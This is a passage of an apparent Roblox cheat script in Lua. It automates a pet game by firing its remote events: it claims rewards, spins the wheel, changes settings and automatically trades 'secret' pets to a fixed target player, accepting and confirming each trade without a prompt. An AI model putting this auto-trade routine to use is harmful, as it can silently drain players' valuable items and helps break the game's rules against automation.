                        tradingUI = game:GetService(""Players"").LocalPlayer.PlayerGui.ScreenGui.Trading
                        if tradingUI and tradingUI.Visible then break end
                        
                        game:GetService(""ReplicatedStorage"").Shared.Framework.Network.Remote.Event:FireServer(""TradeRequest"", targetPlayer)
                        task.wait(3)
                    end
                end
                
                -- Handle active trade
                tradingUI = game:GetService(""Players"").LocalPlayer.PlayerGui.ScreenGui.Trading
                if tradingUI and tradingUI.Visible then
                    -- Verify trading with correct player
                    local tradePartnerName = tradingUI.Frame.Top.Them.Username.Text
                    if string.sub(tradePartnerName, 1, 1) == ""@"" then
                        tradePartnerName = string.sub(tradePartnerName, 2)
                    end
                    
                    if tradePartnerName == targetTradeName then
                        -- Add pets to trade one by one, checking data each time
                        local allPetsAdded = false
                        local petCount = 0
                        
                        while not allPetsAdded and petCount < 10 do
                            -- Get fresh pet data
                            local currentPetData = LocalDataService:Get()
                            
                            -- Get currently traded pets and count them
                            local tradeContent = tradingUI.Frame.Inner.Offers.You.Content
                            local petIDsInTrade = {}
                            petCount = 0
                            
                            for _, item in pairs(tradeContent:GetChildren()) do
                                if item:IsA(""Frame"") and not string.match(item.Name, ""^Blank%d+$"") and not string.match(item.Name, ""^Entry%d+$"") then
                                    petIDsInTrade[item.Name] = true
                                    petCount = petCount + 1
                                end
                            end
                            
                            -- Stop if we've already added 10 pets
                            if petCount >= 10 then
                                allPetsAdded = true
                                break
                            end
                            
                            -- Try to find a pet to add
                            local foundPetToAdd = false
                            local petIdToAdd = nil
                            
                            if currentPetData and currentPetData.Pets then
                                for _, pet in pairs(currentPetData.Pets) do
                                    -- Check if this pet is a secret pet
                                    local isSecretPet = false
                                    for _, secretPetName in pairs(SecretPets) do
                                        if pet.Name == secretPetName then
                                            isSecretPet = true
                                            break
                                        end
                                    end
                                    
                                    if isSecretPet then
                                        if pet.Amount then
                                            -- For pets with Amount, add each index starting from 1
                                            for i = 1, pet.Amount do
                                                local fullPetId = pet.Id .. "":"" .. i
                                                if not petIDsInTrade[fullPetId] then
                                                    petIdToAdd = fullPetId
                                                    foundPetToAdd = true
                                                    break
                                                end
                                            end
                                        else
                                            -- For pets without Amount, just add :0
                                            local fullPetId = pet.Id .. "":0""
                                            if not petIDsInTrade[fullPetId] then
                                                petIdToAdd = fullPetId
                                                foundPetToAdd = true
                                            end
                                        end
                                        
                                        -- Check if we found a pet to add
                                        if foundPetToAdd then
                                            break
                                        end
                                    end
                                end
                            end
                            
                            -- Add the pet if we found one
                            if foundPetToAdd and petIdToAdd then
                                -- Before pet count
                                local beforeCount = petCount
                                
                                -- Add the pet
                                game:GetService(""ReplicatedStorage"").Shared.Framework.Network.Remote.Event:FireServer(""TradeAddPet"", petIdToAdd)
                                task.wait(1) -- Wait a bit longer to ensure UI updates
                                
                                -- Verify the pet was actually added by checking the count again
                                local tradeContent = tradingUI.Frame.Inner.Offers.You.Content
                                local afterCount = 0
                                
                                for _, item in pairs(tradeContent:GetChildren()) do
                                    if item:IsA(""Frame"") and not string.match(item.Name, ""^Blank%d+$"") and not string.match(item.Name, ""^Entry%d+$"") then
                                        afterCount = afterCount + 1
                                    end
                                end
                                
                                -- Update pet count with current number in trade
                                petCount = afterCount
                                
                                -- If count didn't increase, try one more time
                                if afterCount <= beforeCount then
                                    task.wait(0.5)
                                    game:GetService(""ReplicatedStorage"").Shared.Framework.Network.Remote.Event:FireServer(""TradeAddPet"", petIdToAdd)
                                    task.wait(1)
                                end
                            else
                                -- No more pets to add
                                allPetsAdded = true
                            end
                        end
                        
                        -- Double check how many pets we have in trade
                        local finalTradeContent = tradingUI.Frame.Inner.Offers.You.Content
                        local finalPetCount = 0
                        
                        for _, item in pairs(finalTradeContent:GetChildren()) do
                            if item:IsA(""Frame"") and not string.match(item.Name, ""^Blank%d+$"") and not string.match(item.Name, ""^Entry%d+$"") then
                                finalPetCount = finalPetCount + 1
                            end
                        end
                        
                        -- Only proceed if we actually added some pets
                        if finalPetCount > 0 then
                            -- Accept trade after all pets added
                            task.wait(1)
                            game:GetService(""ReplicatedStorage"").Shared.Framework.Network.Remote.Event:FireServer(""TradeAccept"")
                            
                            task.wait(1)
                            -- Check button text
                            local acceptButtonText = tradingUI.Frame.Inner.Offers.Buttons.Accept.Button.Label.Text
                            
                            if acceptButtonText == ""Confirm"" then
                                game:GetService(""ReplicatedStorage"").Shared.Framework.Network.Remote.Event:FireServer(""TradeConfirm"")
                            end
                            
                            task.wait(5)
                        end
                    end
                end
                
                task.wait(1)
            end
        end)
    else
        if tradeThread then
            task.cancel(tradeThread)
            tradeThread = nil
        end
    end
    
    return AutoTradeSecretPets_Toggle
end

-- üåÄ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ Secret Check ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅüåÄ

-- Function to check if user has any secret pets
local function checkForSecretPets()
    -- Get fresh player data each time
    local freshPetData = LocalDataService:Get()
    local foundSecretPet = false
    local secretPetCounts = {}
    local playerName = game:GetService(""Players"").LocalPlayer.Name
    
    -- If data exists and has pets
    if freshPetData and freshPetData.Pets then
        -- Loop through all pets
        for _, pet in pairs(freshPetData.Pets) do
            -- Check if current pet name is in the secret pets list
            for _, secretPetName in pairs(SecretPets) do
                if pet.Name == secretPetName then
                    -- Count the pet
                    secretPetCounts[secretPetName] = (secretPetCounts[secretPetName] or 0) + 1
                    foundSecretPet = true
                end
            end
        end
    end
    
    -- If any secret pets found, create or update the overlay
    if foundSecretPet then
        -- Create green overlay if it doesn't exist
        if not SecretPetOverlay then
            SecretPetOverlay = Instance.new(""ScreenGui"")
            SecretPetOverlay.Name = ""SecretPetOverlay""
            SecretPetOverlay.ResetOnSpawn = false
            SecretPetOverlay.IgnoreGuiInset = true
            SecretPetOverlay.DisplayOrder = 99  -- Make it appear above egg counter
            
            -- Create fully green background
            local frame = Instance.new(""Frame"")
            frame.Size = UDim2.new(1, 0, 1, 0)
            frame.BackgroundColor3 = Color3.fromRGB(0, 255, 0) -- Green
            frame.BackgroundTransparency = 0
            frame.BorderSizePixel = 0
            frame.Name = ""SecretFrame""
            frame.Parent = SecretPetOverlay
            
            -- Add player name at the top
            local playerNameLabel = Instance.new(""TextLabel"")
            playerNameLabel.Size = UDim2.new(1, 0, 0, 60)
            playerNameLabel.Position = UDim2.new(0, 0, 0.1, 0)
            playerNameLabel.BackgroundTransparency = 1
            playerNameLabel.Font = Enum.Font.SourceSansBold
            playerNameLabel.TextSize = 140
            playerNameLabel.TextWrapped = true
            playerNameLabel.TextColor3 = Color3.fromRGB(255, 255, 255) -- White text
            playerNameLabel.Text = ""PLAYER: "" .. string.upper(playerName)
            playerNameLabel.TextStrokeTransparency = 0
            playerNameLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
            playerNameLabel.Name = ""PlayerName""
            playerNameLabel.Parent = frame
            
            -- Add a ScrollingFrame to contain all pet text labels
            local scrollFrame = Instance.new(""ScrollingFrame"")
            scrollFrame.Size = UDim2.new(0.8, 0, 0.5, 0)
            scrollFrame.Position = UDim2.new(0.1, 0, 0.25, 0)
            scrollFrame.BackgroundTransparency = 1
            scrollFrame.ScrollBarThickness = 6
            scrollFrame.CanvasSize = UDim2.new(0, 0, 0, 0) -- Will be updated based on content
            scrollFrame.Name = ""PetList""
            scrollFrame.Parent = frame
            
            SecretPetOverlay.Parent = game:GetService(""CoreGui"")
        else
            -- Update player name if it changed
            SecretPetOverlay.SecretFrame.PlayerName.Text = ""PLAYER: "" .. string.upper(playerName)
        end
        
        -- Get the scrolling frame reference
        local scrollFrame = SecretPetOverlay.SecretFrame.PetList
        
        -- Clear existing pet labels
        for _, child in pairs(scrollFrame:GetChildren()) do
            if child:IsA(""TextLabel"") then
                child:Destroy()
            end
        end
        
        -- Add text labels for each secret pet with count
        local yPosition = 0
        for petName, count in pairs(secretPetCounts) do
            local textLabel = Instance.new(""TextLabel"")
            textLabel.Size = UDim2.new(1, 0, 0, 70)
            textLabel.Position = UDim2.new(0, 0, 0, yPosition)
            textLabel.BackgroundTransparency = 1
            textLabel.Font = Enum.Font.SourceSansBold
            textLabel.TextSize = 140
            textLabel.TextWrapped = true
            textLabel.TextColor3 = Color3.fromRGB(255, 255, 255) -- White text
            textLabel.Text = string.upper(petName) .. "" x"" .. count
            textLabel.TextStrokeTransparency = 0
            textLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
            textLabel.Parent = scrollFrame
            
            yPosition = yPosition + 80
        end
        
        -- Update canvas size to fit all labels
        scrollFrame.CanvasSize = UDim2.new(0, 0, 0, yPosition)
        
        -- Enable auto trade if not already enabled
        if not AutoTradeSecretPets_Toggle then
            autoTradeSecretPets() -- Call the function to enable auto trading
        end
        
        task.wait(5) -- Wait 5 seconds before the next check
        return true
    else
        -- Remove overlay if no secret pets found
        if SecretPetOverlay then
            SecretPetOverlay:Destroy()
            SecretPetOverlay = nil
        end
        
        -- Disable auto trade if it's enabled
        if AutoTradeSecretPets_Toggle then
            autoTradeSecretPets() -- Call the function to disable auto trading
        end
        
        task.wait(10) -- Wait 10 seconds before the next check
        return false
    end
end

-- üåÄ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ Handle Intro ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅüåÄ

local IntroHandling_Toggle = false
local hasHandledIntro = false -- Flag to track if intro was successfully handled

local function SimulateIntroPlayButtonClick()
    local IntroPlayButton = game:GetService(""Players"").LocalPlayer.PlayerGui.Intro.Play.Button
    IntroPlayButton:SetAttribute(""Pressed"", true)
    task.wait(0.1)
    IntroPlayButton:SetAttribute(""Pressed"", false)
end

local function SimulateOptimizedButtonClick()
    local Optimized = game:GetService(""Players"").LocalPlayer.PlayerGui.Intro.Graphics.Content.Low.Action.Button
    Optimized:SetAttribute(""Pressed"", true)
    task.wait(0.1)
    Optimized:SetAttribute(""Pressed"", false)
end

local function handleIntro()
    if IntroHandling_Toggle then
        return hasHandledIntro
    end
    
    IntroHandling_Toggle = true
    
    -- Keep trying until intro is completely gone - no timeout
    while true do
        -- Safely check if intro exists and is enabled
        local success, introStillActive = pcall(function()
            local Intro = game:GetService(""Players"").LocalPlayer.PlayerGui:FindFirstChild(""Intro"")
            
            if Intro and Intro.Enabled then
                -- Check if Play is visible and click it
                if Intro.Play.Visible == true then
                    task.wait(5)
                    SimulateIntroPlayButtonClick()
                    task.wait(1) -- Wait for graphics options to appear
                end
                
                -- Check if Graphics is visible and click low option
                if Intro.Graphics.Visible == true then
                    SimulateOptimizedButtonClick()
                    task.wait(1)
                end
                
                -- Try clicking both again for good measure
                SimulateIntroPlayButtonClick()
                task.wait(0.5)
                SimulateOptimizedButtonClick()
                
                -- Intro still exists and is enabled
                return true
            end
            
            -- Intro is gone or not enabled
            return false
        end)
        
        -- Check if intro is gone
        if success and not introStillActive then
            hasHandledIntro = true
            break
        end
        
        -- Wait a bit before checking again
        task.wait(2)
    end
    
    -- Turn off toggle when done
    IntroHandling_Toggle = false
    
    return hasHandledIntro
end

-- üåÄ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ Daily Rewards Function ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅüåÄ

local CheckRewards_Toggle = false
local hasClaimedDailyReward = false -- Tracks if rewards were successfully claimed
local startCheckTime = nil

local function SimulateShopCloseButtonClick() -- for buying storage
    local ShopClose = game:GetService(""Players"").LocalPlayer.PlayerGui.ScreenGui.DailyRewards.Shop.Top.Close.Button
    ShopClose:SetAttribute(""Pressed"", true)
    task.wait(0.1)
    ShopClose:SetAttribute(""Pressed"", false)
end

local function checkDailyRewards()
    CheckRewards_Toggle = not CheckRewards_Toggle
    
    if CheckRewards_Toggle then
        -- Initialize timer on first check
        startCheckTime = os.time()
        
        -- Start thread or continue with logic
        spawn(function()
            while CheckRewards_Toggle do
                -- Check if we've exceeded the timeout period (300 seconds / 5 minutes)
                if os.time() - startCheckTime > 300 then
                    CheckRewards_Toggle = false -- Stop the function
                    return false
                end
                
                -- Use pcall for safety
                local success, result = pcall(function()
                    -- Check if the daily rewards UI is visible
                    local dailyRewardsUI = game:GetService(""Players"").LocalPlayer.PlayerGui.ScreenGui.DailyRewards
                    
                    if dailyRewardsUI and dailyRewardsUI.Login and dailyRewardsUI.Login.Visible == true then
                        -- Claim the rewards
                        game:GetService(""ReplicatedStorage"").Shared.Framework.Network.Remote.Event:FireServer(""DailyRewardClaimStars"")
                        task.wait(1)
                        
                        -- Close the shop if it appeared
                        if dailyRewardsUI.Shop and dailyRewardsUI.Shop.Visible == true then
                            SimulateShopCloseButtonClick()
                            task.wait(0.5)
                        end
                        
                        -- Mark as successful and stop checking
                        CheckRewards_Toggle = false
                        hasClaimedDailyReward = true
                        return true
                    end
                    
                    -- Wait a bit before checking again
                    task.wait(1)
                    return false
                end)
                
                -- Handle errors
                if not success then
                    CheckRewards_Toggle = false
                    return false
                end
            end
        end)
    end
    
    return hasClaimedDailyReward
end

-- üåÄ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ Auto Claim Playtime ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅüåÄ

local AutoClaimPlaytime_Toggle = false -- Flag to track if we're automatically claiming playtime rewards
local autoClaimingPlaytimeThread = nil -- Variable to store the auto claiming thread
local PlaytimeRewardsClaimed = false -- Flag to track if all playtime rewards are claimed

local function toggleAutoClaimPlaytime()
    -- If all rewards are claimed, don't start again
    if PlaytimeRewardsClaimed then
        return PlaytimeRewardsClaimed
    end
    
    AutoClaimPlaytime_Toggle = not AutoClaimPlaytime_Toggle
    
    if AutoClaimPlaytime_Toggle then
        -- Start a new thread for continuous playtime reward claiming
        autoClaimingPlaytimeThread = spawn(function()
            while AutoClaimPlaytime_Toggle do
                -- Get the Playtime UI
                local Playtime = game:GetService(""Players"").LocalPlayer.PlayerGui.ScreenGui.Playtime
                
                -- Check if Playtime exists
                if Playtime and Playtime:FindFirstChild(""Frame"") and Playtime.Frame:FindFirstChild(""Main"") then
                    local Main = Playtime.Frame.Main
                    local allClaimed = true -- Assume all claimed until we find one that's not
                    local foundAnyRewards = false -- Track if we found any reward UI elements
                    local anyPending = false -- Track if there are any pending rewards
                    
                    -- Loop through all children of Main
                    for _, child in pairs(Main:GetChildren()) do
                        -- Check if this is a numbered reward (1, 2, 3, 4, etc.)
                        if tonumber(child.Name) then
                            foundAnyRewards = true
                            local rewardNumber = tonumber(child.Name)
                            local button = child:FindFirstChild(""Button"")
                            local completed = child:FindFirstChild(""Completed"")
                            
                            -- Only proceed if both button and completed exist
                            if button and completed then
                                local label = button:FindFirstChild(""Label"")
                                
                                -- State 1: Ready to claim
                                if label and label.Text == ""Open"" and not completed.Visible then
                                    allClaimed = false -- Found one that's not claimed
                                    
                                    -- Invoke server to claim the reward
                                    local success, result = pcall(function()
                                        return game:GetService(""ReplicatedStorage"").Shared.Framework.Network.Remote.Function:InvokeServer(""ClaimPlaytime"", rewardNumber)
                                    end)
                                    game:GetService(""ReplicatedStorage"").Shared.Framework.Network.Remote.Event:FireServer(""ClaimSeason"")
                                    -- Wait a bit after claiming
                                    task.wait(1)
                                end
                                
                                -- State 2: Already claimed
                                if completed.Visible and (not label or not label.Visible) then
                                    -- This one is already claimed, don't change allClaimed
                                end
                                
                                -- State 3: Pending (time countdown)
                                if not completed.Visible and label and label.Text ~= ""Open"" then
                                    allClaimed = false -- Not all claimed yet
                                    anyPending = true -- We have pending rewards
                                end
                            end
                        end
                    end
                    
                    -- If we found reward UI elements and all are claimed (none pending), we're done
                    if foundAnyRewards and allClaimed and not anyPending then
                        PlaytimeRewardsClaimed = true
                        AutoClaimPlaytime_Toggle = false
                        break
                    end
                end
                
                -- Wait before checking again
                task.wait(30) -- Check for playtime rewards every 30 seconds
            end
        end)
    end
    
    return AutoClaimPlaytime_Toggle
end

-- üåÄ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ Auto Claim Prizes Function ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅüåÄ

local AutoClaimPrizes_Toggle = false -- Flag to track if we're automatically claiming prizes
local autoClaimingPrizeThread = nil -- Variable to store the auto claiming thread

-- Function to check and claim available prizes once
local function CheckAndClaimPrizes()
    -- Get the Quests UI
    local Prizes = game:GetService(""Players"").LocalPlayer.PlayerGui.ScreenGui.Quests.Frame.Main.Prizes
    
    -- Loop through all prize items (b-1, b-2, etc.)
    for _, prizeItem in pairs(Prizes:GetChildren()) do
        
        -- Check for Content
        local Content = prizeItem:FindFirstChild(""Content"")
        if Content then
            -- Find Bar and Claim inside Content
            local Bar = Content:FindFirstChild(""Bar"")
            local Claim = Content:FindFirstChild(""Claim"")
            
            if Bar and Claim and Bar:FindFirstChild(""Label"") and Claim:FindFirstChild(""Button"") then
                local progressText = Bar.Label.Text
                local ClaimButton = Claim.Button
                
                -- Check if progress is 100% and Claim is visible
                if progressText == ""100%"" and Claim.Visible then

                    -- Simulate button press
                    ClaimButton:SetAttribute(""Pressed"", true)
                    task.wait(0.1)
                    ClaimButton:SetAttribute(""Pressed"", false)
                    
                    -- Return after claiming the first prize found
                    return true
                end
            end
        end
    end

    return false
end

-- Function to check for prizes until no notifications remain
local function checkAllTabsForPrizes()
    local PlayerGui = game:GetService(""Players"").LocalPlayer.PlayerGui
    local QuestsFrame = PlayerGui.ScreenGui.Quests.Frame
    local Sidebar = QuestsFrame.Sidebar
    
    local hasClaimedAny = false
    local keepChecking = true
    
    -- Keep checking until no more notifications are found
    while keepChecking do
        keepChecking = false -- Will be set to true if we find and claim something
        
        -- Check buttons with notifications
        local BubblesButton = Sidebar.Buttons.Bubbles.Button
        local EggsButton = Sidebar.Buttons.Eggs.Button
        local QuestsButton = Sidebar.Buttons.Quests.Button
        
        -- Check for Bubbles notification
        local BubblesNotification = BubblesButton:FindFirstChild(""Notification"")
        if BubblesNotification and BubblesNotification.Visible then
            BubblesButton:SetAttribute(""Pressed"", true)
            task.wait(0.1)
            BubblesButton:SetAttribute(""Pressed"", false)
            task.wait(1) -- Wait for UI to update
            
            -- Try to claim prizes
            local claimed = CheckAndClaimPrizes()
            if claimed then 
                hasClaimedAny = true
                keepChecking = true -- Continue checking
                task.wait(0.5) -- Short wait before checking again
                continue 
            end
        end
        
        -- Check for Eggs notification
        local EggsNotification = EggsButton:FindFirstChild(""Notification"")
        if EggsNotification and EggsNotification.Visible then
            EggsButton:SetAttribute(""Pressed"", true)
            task.wait(0.1)
            EggsButton:SetAttribute(""Pressed"", false)
            task.wait(1) -- Wait for UI to update
            
            -- Try to claim prizes
            local claimed = CheckAndClaimPrizes()
            if claimed then 
                hasClaimedAny = true
                keepChecking = true -- Continue checking
                task.wait(0.5) -- Short wait before checking again
                continue
            end
        end
        
        -- Check Quests tab
        local QuestsNotification = QuestsButton:FindFirstChild(""Notification"")
        if QuestsNotification and QuestsNotification.Visible then
            QuestsButton:SetAttribute(""Pressed"", true)
            task.wait(0.1)
            QuestsButton:SetAttribute(""Pressed"", false)
            task.wait(1) -- Wait for UI to update
            
            -- Try to claim prizes
            local claimed = CheckAndClaimPrizes()
            if claimed then 
                hasClaimedAny = true
                keepChecking = true -- Continue checking
                task.wait(0.5) -- Short wait before checking again
                continue
            end
        end
    end
    
    -- Always end on the Quests tab
    local QuestsButton = Sidebar.Buttons.Quests.Button
    QuestsButton:SetAttribute(""Pressed"", true)
    task.wait(0.1)
    QuestsButton:SetAttribute(""Pressed"", false)
    
    return hasClaimedAny
end

-- Function to toggle automatic prize claiming
local function toggleAutoClaimPrizes()
    AutoClaimPrizes_Toggle = not AutoClaimPrizes_Toggle
    
    if AutoClaimPrizes_Toggle then
        -- Start a new thread for continuous prize claiming
        autoClaimingPrizeThread = spawn(function()
            while AutoClaimPrizes_Toggle do
                checkAllTabsForPrizes()
                task.wait(60) -- Check for prizes every 60 seconds
            end
        end)
    end
    
    return AutoClaimPrizes_Toggle
end

-- üåÄ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ Auto Wheel Spin Function ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅüåÄ

local AutoWheelSpin_Toggle = false -- Flag to track if we're automatically spinning the wheel
local autoSpinningWheelThread = nil -- Variable to store the auto wheel spinning thread

local function WheelSpinButtonClick()
    local WheelSpin = game:GetService(""Players"").LocalPlayer.PlayerGui.ScreenGui.WheelSpin.Frame.Main.Spin.Button
    WheelSpin:SetAttribute(""Pressed"", true)
    task.wait(0.1)
    WheelSpin:SetAttribute(""Pressed"", false)
end

local function toggleAutoWheelSpin()
    AutoWheelSpin_Toggle = not AutoWheelSpin_Toggle
    
    if AutoWheelSpin_Toggle then
        -- Start a new thread for continuous wheel spin checking
        autoSpinningWheelThread = spawn(function()
            while AutoWheelSpin_Toggle do
                local shouldContinueSpinning = false
                
                -- Use pcall for error handling
                pcall(function()
                    -- Get fresh data directly from the LocalDataService
                    local freshData = LocalDataService:Get()
                    
                    -- Check if the player has Spin Tickets in their Powerups
                    local spinTickets = freshData.Powerups and freshData.Powerups[""Spin Ticket""] or 0
                    
                    -- Check if wheel spin UI exists for free spin
                    local wheelSpinUI = game:GetService(""Players"").LocalPlayer.PlayerGui.ScreenGui.WheelSpin
                    
                    if wheelSpinUI and wheelSpinUI.Frame and wheelSpinUI.Frame.Main then
                        local Main = wheelSpinUI.Frame.Main
                        
                        -- Check for free spin
                        if Main.Buttons and Main.Buttons.Free and 
                           Main.Buttons.Free.Button and 
                           Main.Buttons.Free.Button.Title and 
                           Main.Buttons.Free.Button.Title.Text == ""Claim"" then
                            
                            -- Claim the free spin
                            game:GetService(""ReplicatedStorage"").Shared.Framework.Network.Remote.Event:FireServer(""ClaimFreeWheelSpin"")
                            task.wait(1) -- Wait a bit after claiming
                            
                            -- Refresh data after claiming
                            freshData = LocalDataService:Get()
                            spinTickets = freshData.Powerups and freshData.Powerups[""Spin Ticket""] or 0
                        end
                    end
                    
                    -- If spin tickets are available in inventory, use them
                    if spinTickets > 0 then

                        WheelSpinButtonClick()
                        --game:GetService(""ReplicatedStorage"").Shared.Framework.Network.Remote.Function:InvokeServer(""WheelSpin"")
                        task.wait(15) -- Wait longer after spinning to let animations complete
                        
                        -- Refresh data after using a spin ticket
                        freshData = LocalDataService:Get()
                        spinTickets = freshData.Powerups and freshData.Powerups[""Spin Ticket""] or 0
                        
                        -- If we still have tickets, set flag to continue spinning without waiting
                        if spinTickets > 0 then
                            shouldContinueSpinning = true
                        end
                    end
                end)
                
                -- Skip the wait and continue spinning if we have more tickets
                if shouldContinueSpinning then
                    task.wait(0.1) -- Small wait to prevent overwhelming the server
                else
                    -- Wait before checking again
                    task.wait(60) -- Check every 3 minutes
                end
            end
        end)
    end
    
    return AutoWheelSpin_Toggle
end

-- üåÄ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ Set Settings ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅüåÄ

local SetSettings_Toggle = false
local SettingsThread = nil
local settingsApplied = false

local function SetOptimalSettings()
    -- Don't run if settings are already applied
    if settingsApplied then
        return settingsApplied
    end

    SetSettings_Toggle = not SetSettings_Toggle
    
    if SetSettings_Toggle then
        SettingsThread = spawn(function()
            -- Settings to optimize gameplay
            local optimalSettings = {
                [""Hide Bubbles""] = true,
                [""Hide Others Pets""] = true,
                [""Hide All Pets""] = true,
                [""Compact Pet Inventory""] = true,
                [""Skip Easy Legendary""] = true,
                [""Music""] = 0,
                [""Sound Effects""] = 0
            }
            
            -- Maximum retries to prevent getting stuck
            local maxRetries = 3
            local retryCount = 0
            
            while retryCount < maxRetries and SetSettings_Toggle do
                -- Get fresh data
                local data = LocalDataService:Get()
                local Settings = data.Settings or {}
                
                -- Check if any settings need to be applied
                local settingsToApply = {}
                local allSettingsMatch = true
                
                for setting, value in pairs(optimalSettings) do
                    -- Skip settings that don't exist
                    if Settings[setting] == nil then
                        continue
                    end
                    
                    local settingMatches = false
                    
                    if setting == ""Music"" or setting == ""Sound Effects"" then
                        settingMatches = Settings[setting] <= 1
                    else
                        settingMatches = Settings[setting] == value
                    end
                    
                    if not settingMatches then
                        allSettingsMatch = false
                        table.insert(settingsToApply, {setting = setting, value = value})
                    end
                end
                
                -- If all settings match optimal values, we're done
                if allSettingsMatch then
                    break
                end
                
                -- Apply each setting that needs changing
                for _, settingData in ipairs(settingsToApply) do
                    Remote.Event:FireServer(""SetSetting"", settingData.setting, settingData.value)
                    task.wait(0.3)  -- Slightly longer delay to ensure each setting is processed
                end
                
                -- Wait for settings to apply
                task.wait(1.5)
                
                -- Increment retry counter
                retryCount = retryCount + 1
            end
            
            -- Mark as complete regardless of verification outcome
            SetSettings_Toggle = false
            settingsApplied = true
        end)
    end
    
    return settingsApplied
end

-- üåÄ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ Auto Hide Overlay ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅüåÄ

local AutoHideOverlay_Toggle = false -- Flag to track if we're automatically hiding overlays
